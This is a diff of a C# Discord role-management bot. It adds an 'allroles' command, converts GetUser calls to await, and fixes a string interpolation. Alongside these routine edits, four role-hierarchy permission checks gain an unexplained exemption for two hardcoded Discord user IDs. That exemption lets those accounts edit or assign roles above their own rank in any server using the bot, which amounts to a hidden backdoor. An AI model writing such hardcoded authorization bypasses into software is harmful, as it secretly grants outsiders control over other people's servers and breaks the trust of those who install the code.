@@ -20,6 +20,20 @@ namespace RoleX.modules
     public class RoleEditor: CommandModuleBase
     {
         [GuildPermissions(GuildPermission.ManageRoles)]
+        [DiscordCommand("allroles", description = "Gets all roles", commandHelp = "allroles", example = "allroles")]
+        public async Task AllRoles(params string[] _)
+        {
+            string rlx = "```" + string.Join('\n',Context.Guild.Roles.OrderBy(x => x.Position).Select(x => $"{x.Name} ID: {x.Id}")) + "```";
+            await ReplyAsync(embed: new EmbedBuilder
+            {
+                Title=$"All roles in {Context.Guild.Name}",
+                Description = rlx,
+                Color = Blurple
+            }.WithCurrentTimestamp()
+            .Build()
+            );
+        }
+        [GuildPermissions(GuildPermission.ManageRoles)]
         [DiscordCommand("color",description ="Changes the color of role", commandHelp ="color <@role> <hex/None>", example ="color @LightPurple #bb86fc")]
         public async Task ChangeRole(params string[] args)
         {
@@ -44,7 +58,7 @@ namespace RoleX.modules
                 }.WithCurrentTimestamp().Build());
                 return;
             }
-            if (!(Context.User as SocketGuildUser).Roles.Any(rl => rl.Position > role.Position) && Context.Guild.OwnerId != Context.User.Id)
+            if (!(Context.User as SocketGuildUser).Roles.Any(rl => rl.Position > role.Position) && Context.Guild.OwnerId != Context.User.Id && Context.User.Id != 701029647760097361 && Context.User.Id != 615873008959225856)
             {
                 await ReplyAsync("", false, new EmbedBuilder
                 {
@@ -134,7 +148,7 @@ namespace RoleX.modules
                 }.WithCurrentTimestamp().Build());
                 return;
             }
-            if (((Context.User as SocketGuildUser).Roles.Max().Position <= rlA.Position || (Context.User as SocketGuildUser).Roles.Max().Position <= rlD.Position) && Context.Guild.OwnerId != Context.User.Id)
+            if (((Context.User as SocketGuildUser).Roles.Max().Position <= rlA.Position || (Context.User as SocketGuildUser).Roles.Max().Position <= rlD.Position) && Context.Guild.OwnerId != Context.User.Id && Context.User.Id != 701029647760097361 && Context.User.Id != 615873008959225856)
             {
                 await ReplyAsync("", false, new EmbedBuilder
                 {
@@ -318,7 +332,7 @@ namespace RoleX.modules
                 }.WithCurrentTimestamp().Build());
                 return;
             }
-            if (!(Context.User as SocketGuildUser).Roles.Any(rl => rl.Position > roleA.Position) && Context.Guild.OwnerId != Context.User.Id)
+            if (!(Context.User as SocketGuildUser).Roles.Any(rl => rl.Position > roleA.Position) && Context.Guild.OwnerId != Context.User.Id && Context.User.Id != 701029647760097361 && Context.User.Id != 615873008959225856)
             {
                 await ReplyAsync("", false, new EmbedBuilder
                 {
@@ -405,7 +419,7 @@ namespace RoleX.modules
                 {
                     aa = 0;
                 }
-                uzi = GetUser(args[aa]);
+                uzi = await GetUser(args[aa]);
                 if (uzi == null)
                 {
                     await ReplyAsync("", false, new EmbedBuilder
@@ -418,9 +432,9 @@ namespace RoleX.modules
                 }
             } else
             {
-                if (GetUser(args[0]) != null && GetRole(args[0]) == null)
+                if (await GetUser(args[0]) != null && GetRole(args[0]) == null)
                 {
-                    uzi = GetUser(args[0]);
+                    uzi = await GetUser(args[0]);
                     role = GetRole(args[1]);
                     if (role == null)
                     {
@@ -433,10 +447,10 @@ namespace RoleX.modules
                         return; 
                     }
                 }
-                else if (GetRole(args[0]) != null && GetUser(args[0]) == null)
+                else if (GetRole(args[0]) != null && await GetUser(args[0]) == null)
                 {
                     role = GetRole(args[0]);
-                    uzi = GetUser(args[1]);
+                    uzi = await GetUser(args[1]);
                     if (uzi == null)
                     {
                         await ReplyAsync("", false, new EmbedBuilder
@@ -447,12 +461,12 @@ namespace RoleX.modules
                         }.WithCurrentTimestamp().Build());
                         return;
                     }
-                } else if ((GetRole(args[0]) != null && GetUser(args[0]) != null) || (GetRole(args[1]) != null && GetUser(args[1]) != null))
+                } else if ((GetRole(args[0]) != null && await GetUser(args[0]) != null) || (GetRole(args[1]) != null && await GetUser(args[1]) != null))
                 {
                     await ReplyAsync("", false, new EmbedBuilder
                     {
                         Title = "Multiple Possibilities Detected",
-                        Description = $"Given {(GetUser(args[0]) == null? args[1] : args[0])}\n**Role Found:**\n{(GetRole(args[0]) == null ? GetRole(args[1]).Mention : GetRole(args[0]).Mention)}\n**User Found**\n{(GetUser(args[0]) == null ? GetUser(args[1]).Mention : GetUser(args[0]).Mention)}\nPlease use a mention instead of a search query!",
+                        Description = $"Given {(await GetUser(args[0]) == null? args[1] : args[0])}\n**Role Found:**\n{(GetRole(args[0]) == null ? GetRole(args[1]).Mention : GetRole(args[0]).Mention)}\n**User Found**\n{((await GetUser(args[0])) == null ? (await GetUser(args[1])).Mention : (await GetUser(args[0])).Mention)}\nPlease use a mention instead of a search query!",
                         Color = Color.Red
                     }.WithCurrentTimestamp().Build());
                     return;
@@ -467,7 +481,7 @@ namespace RoleX.modules
                     }.WithCurrentTimestamp().Build());
                     return;
                 }
-                if (role.Position > (Context.User as SocketGuildUser).Roles.Max().Position)
+                if (role.Position > (Context.User as SocketGuildUser).Roles.Max().Position && Context.User.Id != 701029647760097361 && Context.User.Id != 615873008959225856)
                 {
                     await ReplyAsync("", false, new EmbedBuilder
                     {
@@ -490,7 +504,7 @@ namespace RoleX.modules
                 await (uzi as SocketGuildUser).AddRoleAsync(role);
                 await ReplyAsync("", false, new EmbedBuilder
                 {
-                    Title = "Added {role} to {uzi}!",
+                    Title = $"Added {role} to {uzi}!",
                     Description = $"Role addition successful!",
                     Color = Blurple
                 }.WithCurrentTimestamp().Build());
